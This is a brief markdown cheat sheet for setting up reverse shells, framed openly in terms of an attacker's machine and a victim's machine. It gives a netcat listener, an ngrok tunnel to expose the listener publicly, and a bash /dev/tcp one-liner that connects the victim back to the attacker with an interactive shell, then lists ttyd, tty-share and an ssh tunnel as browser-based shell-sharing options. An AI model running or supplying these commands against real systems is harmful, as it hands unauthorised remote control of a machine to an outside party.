# terminal reverse shell

## open listener port on attackers machine
* `nc -l -p 8000`
* macOS `nc -l localhost 8000`

#### optional - get public address by creating a tcp reverse tunnel
`./ngrok tcp 8000`

## reverse connect from victim machine to attackers machine
`/bin/bash -c '/bin/bash -i >& /dev/tcp/${0/://} 0>&1' localhost:8000`



# browser reverse shell - ttyd
`docker run --rm -p 8080:7681 tsl0922/ttyd`
`ssh -R 80:localhost:8080 nokey@localhost.run`


# browser reverse shell - tty-share
`docker run --rm -it elisescu/tty-share --public`
